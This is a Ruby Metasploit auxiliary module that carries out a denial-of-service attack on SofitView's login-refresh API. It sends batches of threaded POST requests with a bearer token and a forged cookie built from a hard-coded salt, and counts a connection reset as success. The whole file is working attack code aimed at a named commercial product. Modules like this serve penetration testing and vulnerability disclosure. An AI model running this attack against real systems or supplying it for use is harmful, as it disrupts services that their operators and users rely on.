# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'SofitView Mongo Storage Overflow',
      'Author' => ['Alan Placidina Maria'],
      'DisclosureDate' => 'Sep 26 2019'
    ))

    register_options(
      [
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('TOKEN', [true, 'Bearer Token', '']),
        Opt::RPORT(443)
      ]
    )
  end

  def rlimit
    datastore['RLIMIT']
  end

  def thread_count
    datastore['THREADS']
  end

  def run
    host = datastore['VHOST']
    timeout = datastore['TIMEOUT']
    token = datastore['TOKEN']

    uid = rand(1000..50_000).to_s
    md5 = Digest::MD5.digest uid + 'POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF'
    b64 = Base64.strict_encode64(md5)

    body = "{\"token\": \"#{token}\"}"

    req = "POST /api/v1/users/login/refresh HTTP/1.1\r\n" \
          "Accept: */*\r\n" \
          "Accept-Encoding: gzip, deflate, br\r\n" \
          "Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3\r\n" \
          "Authorization: Bearer #{token}\r\n" \
          "Cache-Control: no-cache\r\n" \
          "Connection: keep-alive\r\n" \
          "Content-Type: application/json\r\n" \
          "Content-Length: #{body.length}\r\n" \
          "Cookie: uid=#{b64}\r\n" \
          "DNT: 1\r\n" \
          "Host: #{host}\r\n" \
          "Pragma: no-cache\r\n" \
          "Referer: TODO:\r\n" \
          "TE: Trailers\r\n" \
          "User-Agent: #{Rex::Text.rand_text_english(rand(1..42))}\r\n\r\n" \
          "#{body}"

    starting_thread = 1
    while starting_thread < rlimit
      ubound = [rlimit - (starting_thread - 1), thread_count].min
      print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

      threads = []
      1.upto(ubound) do |i|
        threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_i|
          begin
            connect
            sock.put(req + "\r\n\r\n")
            res = sock.get_once(-1, timeout)
            disconnect

            print_error('DoS packet unsuccessful')
          rescue ::Rex::ConnectionRefused
            print_error("Unable to connect to #{peer}")
          rescue ::Errno::ECONNRESET, ::EOFError
            print_good('DoS packet successful')
          ensure
            disconnect
          end
        end
      end

      threads.each(&:join)
      print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
      starting_thread += ubound
    end
  end
end
